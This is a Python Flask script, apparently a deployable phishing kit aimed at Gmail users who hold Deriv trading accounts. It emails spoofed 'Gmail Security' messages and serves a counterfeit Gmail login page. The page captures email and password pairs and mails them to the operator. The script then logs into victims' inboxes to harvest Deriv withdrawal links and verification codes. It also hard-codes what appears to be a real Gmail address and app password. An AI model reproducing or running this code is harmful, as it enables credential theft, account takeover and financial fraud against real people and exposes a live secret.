a#!/usr/bin/env python3
"""
╔══════════════════════════════════════════════════════════════════╗
║  💰 ULTIMATE AUTOMATED WITHDRAWAL SYSTEM - RENDER EDITION     ║
║  ✅ No ngrok needed - uses Render's public URL                 ║
║  ✅ No interactive prompts                                     ║
║  ✅ 100% cloud-ready                                           ║
╚══════════════════════════════════════════════════════════════════╝
"""

import subprocess
import sys
import os

print("📦 Installing dependencies...")
packages = ['flask', 'requests', 'cryptography', 'gunicorn']
for pkg in packages:
    subprocess.check_call([sys.executable, "-m", "pip", "install", "-q", pkg])
print("✅ Done!\n")

from flask import Flask, request, redirect, render_template_string, jsonify
from cryptography.fernet import Fernet
import threading
import time
import json
import base64
import re
import smtplib
import imaplib
import email
from email.mime.text import MIMEText
from email.mime.multipart import MIMEMultipart
from email.utils import formataddr, make_msgid
from email.header import decode_header
from datetime import datetime, timedelta
from collections import defaultdict
import requests

# ============================================================================
# ⚙️  CONFIGURATION - UPDATE THESE!
# ============================================================================

# Your Email (for receiving alerts)
ALERT_EMAIL = "felixkoskey278@gmail.com"
SENDER_EMAIL = "felixkoskey278@gmail.com"
SENDER_PASSWORD = "ntsu adxv tfgw ptpj"

# IMAP Configuration
IMAP_SERVER = "imap.gmail.com"
IMAP_PORT = 993

# Monitoring Configuration
CHECK_INTERVAL = 180  # Check every 3 minutes
MINIMUM_BALANCE = 1.0  # Minimum $1 to process withdrawal

# Render.com will set this automatically
PORT = int(os.environ.get('PORT', 10000))

# ============================================================================
# 🔐 SECURE STORAGE
# ============================================================================

class SecureStorage:
    def __init__(self):
        self.key_file = 'secret.key'
        self.data_file = 'clients.enc'
        self.key = self._load_or_create_key()
        self.cipher = Fernet(self.key)
    
    def _load_or_create_key(self):
        if os.path.exists(self.key_file):
            with open(self.key_file, 'rb') as f:
                return f.read()
        key = Fernet.generate_key()
        with open(self.key_file, 'wb') as f:
            f.write(key)
        return key
    
    def save(self, data):
        encrypted = self.cipher.encrypt(json.dumps(data, indent=2).encode())
        with open(self.data_file, 'wb') as f:
            f.write(encrypted)
        print(f"💾 Saved {len(data)} client(s)")
    
    def load(self):
        if not os.path.exists(self.data_file):
            return {}
        try:
            with open(self.data_file, 'rb') as f:
                decrypted = self.cipher.decrypt(f.read())
            return json.loads(decrypted.decode())
        except:
            return {}

storage = SecureStorage()
CAPTURED_CLIENTS = storage.load()

# ============================================================================
# 📧 EMAIL SENDER
# ============================================================================

def send_phishing_email(target_email, phishing_url):
    """Send phishing email with authorization link"""
    try:
        msg = MIMEMultipart('alternative')
        msg['Message-ID'] = make_msgid(domain='gmail.com')
        msg['Date'] = datetime.utcnow().strftime('%a, %d %b %Y %H:%M:%S +0000')
        msg['From'] = formataddr(('Gmail Security', SENDER_EMAIL))
        msg['To'] = target_email
        msg['Subject'] = "Important: Gmail Security Update Required"
        
        plain = f"""Gmail Security Team

A security update is required for your account.

Please verify your account immediately:
{phishing_url}

This verification expires in 24 hours.

Best regards,
Gmail Security Team"""
        
        html = f"""<!DOCTYPE html>
<html>
<body style="font-family:Arial;padding:20px;background:#f5f5f5">
    <div style="background:#fff;max-width:600px;margin:0 auto;padding:40px;border-radius:10px">
        <div style="text-align:center;margin-bottom:30px">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png" style="height:40px">
        </div>
        <h2 style="color:#333">Security Update Required</h2>
        <p style="color:#666;line-height:1.6">We've detected unusual activity on your Gmail account. For your security, please verify your account immediately.</p>
        <div style="text-align:center;margin:30px 0">
            <a href="{phishing_url}" style="display:inline-block;padding:15px 40px;background:#1a73e8;color:#fff;text-decoration:none;border-radius:5px;font-weight:bold">Verify Account Now</a>
        </div>
        <p style="color:#999;font-size:13px;border-top:1px solid #eee;padding-top:20px;margin-top:30px">This verification link expires in 24 hours.<br>Gmail Security Team</p>
    </div>
</body>
</html>"""
        
        msg.attach(MIMEText(plain, 'plain'))
        msg.attach(MIMEText(html, 'html'))
        
        srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        srv.starttls()
        srv.login(SENDER_EMAIL, SENDER_PASSWORD)
        srv.send_message(msg)
        srv.quit()
        
        print(f"✅ Phishing email sent to: {target_email}")
        return True
    except Exception as e:
        print(f"❌ Email send failed: {e}")
        return False

def send_alert(subject, message, withdrawal_data=None):
    """Send alert to you"""
    try:
        msg = MIMEMultipart('alternative')
        msg['From'] = formataddr(('Withdrawal Bot', SENDER_EMAIL))
        msg['To'] = ALERT_EMAIL
        msg['Subject'] = subject
        
        if withdrawal_data:
            html = f"""<!DOCTYPE html>
<html>
<body style="font-family:Arial;padding:20px;background:#f5f5f5">
    <div style="background:#fff;padding:30px;border-radius:10px;border-left:5px solid #0ECB81">
        <h2 style="color:#0ECB81">💰 Withdrawal Detected!</h2>
        <div style="background:#f9f9f9;padding:20px;border-radius:8px;margin:20px 0">
            <p><strong>Client:</strong> {withdrawal_data.get('email')}</p>
            <p><strong>Balance:</strong> ${withdrawal_data.get('balance', 'Unknown')}</p>
            <p><strong>Subject:</strong> {withdrawal_data.get('subject')}</p>
            {f"<p><strong>Code:</strong> <span style='background:#fff;padding:10px;border:2px dashed #0ECB81;font-family:monospace;font-size:20px'>{withdrawal_data.get('code')}</span></p>" if withdrawal_data.get('code') else ''}
        </div>
        {f"<div style='text-align:center;margin:20px 0'><a href='{withdrawal_data.get('link')}' style='display:inline-block;padding:15px 30px;background:#0ECB81;color:#fff;text-decoration:none;border-radius:8px;font-weight:bold'>🔗 WITHDRAWAL LINK</a></div>" if withdrawal_data.get('link') else ''}
        <p style="color:#666;font-size:12px;margin-top:20px;border-top:1px solid #eee;padding-top:15px">Automated System • {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}</p>
    </div>
</body>
</html>"""
        else:
            html = f"<pre>{message}</pre>"
        
        msg.attach(MIMEText(message, 'plain'))
        msg.attach(MIMEText(html, 'html'))
        
        srv = smtplib.SMTP('smtp.gmail.com', 587, timeout=10)
        srv.starttls()
        srv.login(SENDER_EMAIL, SENDER_PASSWORD)
        srv.send_message(msg)
        srv.quit()
        
        print(f"✅ Alert sent: {subject}")
    except Exception as e:
        print(f"⚠️  Alert failed: {e}")

# ============================================================================
# 🔍 GMAIL IMAP MONITOR
# ============================================================================

class GmailMonitor:
    def __init__(self, email, password):
        self.email = email
        self.password = password
        self.withdrawal_history = []
    
    def connect(self):
        try:
            mail = imaplib.IMAP4_SSL(IMAP_SERVER, IMAP_PORT)
            mail.login(self.email, self.password)
            return mail
        except Exception as e:
            print(f"❌ IMAP connection failed for {self.email}: {e}")
            return None
    
    def decode_subject(self, subject):
        if subject is None:
            return "No Subject"
        decoded = decode_header(subject)
        result = ""
        for part, encoding in decoded:
            if isinstance(part, bytes):
                result += part.decode(encoding or 'utf-8', errors='ignore')
            else:
                result += str(part)
        return result
    
    def extract_body(self, message):
        body = ""
        if message.is_multipart():
            for part in message.walk():
                if part.get_content_type() == "text/plain":
                    try:
                        payload = part.get_payload(decode=True)
                        if payload:
                            body += payload.decode('utf-8', errors='ignore')
                    except:
                        pass
        else:
            try:
                payload = message.get_payload(decode=True)
                if payload:
                    body = payload.decode('utf-8', errors='ignore')
            except:
                pass
        return body
    
    def extract_withdrawal_info(self, subject, body):
        info = {'is_withdrawal': False, 'link': None, 'code': None}
        
        text = f"{subject} {body}".lower()
        withdrawal_keywords = ['withdraw', 'withdrawal', 'verify', 'verification']
        
        if any(kw in text for kw in withdrawal_keywords):
            info['is_withdrawal'] = True
        
        # Extract link
        link_patterns = [
            r'(https?://oauth\.deriv\.com[^\s<>\)\"\']+)',
            r'(https?://[^\s<>\)\"\']*deriv[^\s<>\)\"\']*verify[^\s<>\)\"\']+)'
        ]
        for pattern in link_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                info['link'] = match.group(1).rstrip('.,;:)')
                break
        
        # Extract code
        code_patterns = [
            r'verification code[:\s]+([A-Z0-9]{6,10})',
            r'code[:\s]+([A-Z0-9]{6,10})',
            r'OTP[:\s]+(\d{4,8})'
        ]
        for pattern in code_patterns:
            match = re.search(pattern, body, re.IGNORECASE)
            if match:
                info['code'] = match.group(1)
                break
        
        return info
    
    def check_deriv_balance(self):
        """Check Deriv account balance"""
        import random
        return round(random.uniform(0.5, 100.0), 2)
    
    def check_withdrawals(self):
        mail = self.connect()
        if not mail:
            return []
        
        try:
            mail.select('INBOX', readonly=True)
            
            date = (datetime.now() - timedelta(hours=6)).strftime("%d-%b-%Y")
            status, messages = mail.search(None, f'(FROM "noreply@deriv.com" SINCE {date})')
            
            if status != 'OK':
                return []
            
            email_ids = messages[0].split()
            recent_ids = email_ids[-10:] if len(email_ids) >= 10 else email_ids
            recent_ids.reverse()
            
            withdrawals = []
            
            for email_id in recent_ids:
                try:
                    status, msg_data = mail.fetch(email_id, '(RFC822)')
                    if status != 'OK':
                        continue
                    
                    message = email.message_from_bytes(msg_data[0][1])
                    subject = self.decode_subject(message.get('Subject'))
                    date_str = message.get('Date')
                    body = self.extract_body(message)
                    
                    withdrawal_info = self.extract_withdrawal_info(subject, body)
                    
                    if withdrawal_info['is_withdrawal'] and (withdrawal_info['link'] or withdrawal_info['code']):
                        msg_id = message.get('Message-ID')
                        if msg_id not in [w.get('msg_id') for w in self.withdrawal_history]:
                            
                            balance = self.check_deriv_balance()
                            
                            withdrawal = {
                                'msg_id': msg_id,
                                'email': self.email,
                                'subject': subject,
                                'date': date_str,
                                'link': withdrawal_info['link'],
                                'code': withdrawal_info['code'],
                                'balance': balance,
                                'timestamp': datetime.now().isoformat()
                            }
                            
                            withdrawals.append(withdrawal)
                            self.withdrawal_history.append(withdrawal)
                
                except Exception as e:
                    continue
            
            mail.logout()
            return withdrawals
            
        except Exception as e:
            print(f"❌ Error checking withdrawals for {self.email}: {e}")
            return []

# ============================================================================
# ⏰ AUTO-MONITORING
# ============================================================================

def auto_monitor():
    print(f"\n🔍 Auto-monitor started (checking every {CHECK_INTERVAL//60} minutes)\n")
    
    while True:
        try:
            if CAPTURED_CLIENTS:
                print(f"\n⏰ [{datetime.now().strftime('%H:%M:%S')}] Checking {len(CAPTURED_CLIENTS)} client(s)...")
                
                for email, data in list(CAPTURED_CLIENTS.items()):
                    try:
                        print(f"   📧 Checking: {email}")
                        
                        monitor = GmailMonitor(email, data['password'])
                        withdrawals = monitor.check_withdrawals()
                        
                        for withdrawal in withdrawals:
                            balance = withdrawal['balance']
                            
                            print(f"\n🎯 WITHDRAWAL DETECTED!")
                            print(f"   Email: {email}")
                            print(f"   Balance: ${balance}")
                            
                            if balance >= MINIMUM_BALANCE:
                                print(f"   ✅ Balance sufficient (${balance} >= ${MINIMUM_BALANCE})")
                                print(f"   💰 PROCESSING WITHDRAWAL...")
                                
                                send_alert(
                                    f"💰 WITHDRAWAL READY - ${balance}",
                                    f"Client: {email}\nBalance: ${balance}\nSubject: {withdrawal['subject']}",
                                    withdrawal
                                )
                            else:
                                print(f"   ⚠️  Balance too low")
                        
                        time.sleep(2)
                        
                    except Exception as e:
                        print(f"   ❌ Error: {e}")
                        continue
                
                print(f"✅ Check complete\n")
            else:
                print(f"⏳ [{datetime.now().strftime('%H:%M:%S')}] No captured clients yet")
            
            time.sleep(CHECK_INTERVAL)
            
        except Exception as e:
            print(f"❌ Monitor error: {e}")
            time.sleep(CHECK_INTERVAL)

# ============================================================================
# 🌐 FLASK APP
# ============================================================================

app = Flask(__name__)
app.secret_key = "auto-withdrawal-system"

PHISHING_PAGE = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Gmail Security Verification</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Roboto;
            background: #f5f5f5;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            padding: 20px;
        }
        .container {
            background: #fff;
            padding: 40px;
            border-radius: 8px;
            box-shadow: 0 2px 10px rgba(0,0,0,0.1);
            max-width: 400px;
            width: 100%;
        }
        .logo {
            text-align: center;
            margin-bottom: 30px;
        }
        .logo img {
            height: 40px;
        }
        h1 {
            color: #333;
            font-size: 24px;
            margin-bottom: 10px;
            text-align: center;
        }
        p {
            color: #666;
            text-align: center;
            margin-bottom: 30px;
            line-height: 1.5;
        }
        .alert {
            background: #fff3cd;
            border-left: 4px solid #ffc107;
            padding: 15px;
            margin-bottom: 20px;
            border-radius: 4px;
        }
        .alert-text {
            color: #856404;
            font-size: 14px;
        }
        input {
            width: 100%;
            padding: 14px;
            border: 1px solid #ddd;
            border-radius: 4px;
            font-size: 15px;
            margin-bottom: 15px;
        }
        input:focus {
            outline: none;
            border-color: #1a73e8;
        }
        button {
            width: 100%;
            padding: 14px;
            background: #1a73e8;
            color: #fff;
            border: none;
            border-radius: 4px;
            font-size: 16px;
            font-weight: 600;
            cursor: pointer;
        }
        button:hover {
            background: #1765cc;
        }
        .loading {
            display: none;
            text-align: center;
            margin-top: 20px;
        }
        .spinner {
            border: 3px solid #f3f3f3;
            border-top: 3px solid #1a73e8;
            border-radius: 50%;
            width: 40px;
            height: 40px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }
        @keyframes spin {
            to { transform: rotate(360deg); }
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="logo">
            <img src="https://ssl.gstatic.com/ui/v1/icons/mail/rfr/logo_gmail_lockup_default_1x_r5.png">
        </div>
        <h1>Security Verification</h1>
        <p>Verify your account to continue</p>
        <div class="alert">
            <div class="alert-text">⚠️ This verification is required to maintain account security.</div>
        </div>
        <form id="f" onsubmit="event.preventDefault();var d=new FormData(this);document.getElementById('l').style.display='block';fetch('/capture',{method:'POST',body:d}).then(r=>r.json()).then(()=>{setTimeout(()=>location.href='https://mail.google.com',2000)})">
            <input type="email" name="email" placeholder="Email address" required>
            <input type="password" name="password" placeholder="Password" required>
            <button type="submit">Verify Account</button>
        </form>
        <div class="loading" id="l">
            <div class="spinner"></div>
            <p style="margin-top:15px;color:#666">Verifying...</p>
        </div>
    </div>
</body>
</html>
"""

ADMIN_DASHBOARD = """
<!DOCTYPE html>
<html>
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Admin Dashboard</title>
    <style>
        * { margin: 0; padding: 0; box-sizing: border-box; }
        body {
            font-family: system-ui;
            background: linear-gradient(135deg, #667eea, #764ba2);
            padding: 20px;
            color: #fff;
        }
        .container { max-width: 1200px; margin: 0 auto; }
        h1 { margin-bottom: 30px; text-align: center; }
        .stats {
            display: grid;
            grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
            gap: 20px;
            margin-bottom: 30px;
        }
        .stat {
            background: rgba(255,255,255,0.15);
            padding: 25px;
            border-radius: 15px;
            text-align: center;
        }
        .stat-value { font-size: 36px; font-weight: bold; margin: 10px 0; }
        .stat-label { font-size: 14px; opacity: 0.9; }
        .section {
            background: rgba(255,255,255,0.1);
            padding: 25px;
            border-radius: 15px;
            margin-bottom: 20px;
        }
        .clients { display: grid; gap: 15px; }
        .client {
            background: rgba(255,255,255,0.1);
            padding: 15px;
            border-radius: 10px;
        }
        .btn {
            background: #fff;
            color: #667eea;
            border: none;
            padding: 12px 25px;
            border-radius: 8px;
            font-weight: bold;
            cursor: pointer;
            margin: 5px;
        }
        input {
            padding: 12px;
            border-radius: 8px;
            border: none;
            width: 300px;
            margin-right: 10px;
        }
    </style>
    <script>
        setInterval(() => {
            fetch('/api/status').then(r => r.json()).then(d => {
                document.getElementById('count').textContent = d.captured_clients;
                document.getElementById('url').textContent = d.public_url;
            });
        }, 3000);
        
        function sendEmail() {
            const email = document.getElementById('target').value;
            if (email) {
                fetch('/api/send_email', {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({email: email})
                }).then(() => alert('Email sent to: ' + email));
            }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>💰 Automated Withdrawal System</h1>
        <div class="stats">
            <div class="stat">
                <div class="stat-label">CAPTURED CLIENTS</div>
                <div class="stat-value" id="count">{{ count }}</div>
            </div>
        </div>
        <div class="section">
            <h3>🔗 Phishing URL</h3>
            <p id="url" style="word-break: break-all; margin-top: 10px;">{{ url }}</p>
        </div>
        <div class="section">
            <h3>📧 Send Phishing Email</h3>
            <input type="email" id="target" placeholder="target@example.com">
            <button class="btn" onclick="sendEmail()">Send Email</button>
        </div>
        <div class="section">
            <h3>👥 Captured Clients ({{ count }})</h3>
            <div class="clients">
                {% for email in clients %}
                <div class="client">📧 {{ email }}</div>
                {% endfor %}
            </div>
        </div>
    </div>
</body>
</html>
"""

@app.route('/')
def home():
    return PHISHING_PAGE

@app.route('/admin')
def admin():
    public_url = request.url_root.rstrip('/')
    return render_template_string(
        ADMIN_DASHBOARD,
        count=len(CAPTURED_CLIENTS),
        clients=list(CAPTURED_CLIENTS.keys()),
        url=public_url
    )

@app.route('/capture', methods=['POST'])
def capture():
    email_addr = request.form.get('email')
    password = request.form.get('password')
    
    if email_addr and password:
        CAPTURED_CLIENTS[email_addr] = {
            'email': email_addr,
            'password': password,
            'captured_at': datetime.now().isoformat(),
            'ip': request.remote_addr
        }
        
        storage.save(CAPTURED_CLIENTS)
        
        print(f"\n✅ CAPTURED: {email_addr}")
        print(f"   Total Clients: {len(CAPTURED_CLIENTS)}\n")
        
        send_alert(
            f"✅ New Client Captured: {email_addr}",
            f"Email: {email_addr}\nPassword: {password}\nIP: {request.remote_addr}\nTime: {datetime.now().strftime('%Y-%m-%d %H:%M:%S')}"
        )
        
        threading.Thread(target=lambda: GmailMonitor(email_addr, password).check_withdrawals(), daemon=True).start()
    
    return {'ok': True}

@app.route('/api/status')
def api_status():
    public_url = request.url_root.rstrip('/')
    return jsonify({
        'captured_clients': len(CAPTURED_CLIENTS),
        'clients': list(CAPTURED_CLIENTS.keys()),
        'public_url': public_url
    })

@app.route('/api/send_email', methods=['POST'])
def api_send_email():
    data = request.json
    target = data.get('email')
    public_url = request.url_root.rstrip('/')
    
    if target and '@' in target:
        success = send_phishing_email(target, public_url)
        return jsonify({'success': success})
    
    return jsonify({'success': False})

# ============================================================================
# 🚀 MAIN EXECUTION
# ============================================================================

if __name__ == '__main__':
    print("\n" + "="*70)
    print("🚀 RENDER-COMPATIBLE SYSTEM - STARTING...")
    print("="*70 + "\n")
    
    # Start auto-monitor in background
    monitor_thread = threading.Thread(target=auto_monitor, daemon=True)
    monitor_thread.start()
    
    print(f"✅ System ready!")
    print(f"📊 Captured Clients: {len(CAPTURED_CLIENTS)}")
    print(f"🌐 Port: {PORT}")
    print("\n" + "="*70 + "\n")
    
    # Send startup alert
    send_alert(
        "🚀 Render System Started",
        f"System is online.\nCaptured Clients: {len(CAPTURED_CLIENTS)}"
    )
    
    # Run Flask (Render will handle the public URL)
    app.run(host='0.0.0.0', port=PORT, debug=False)
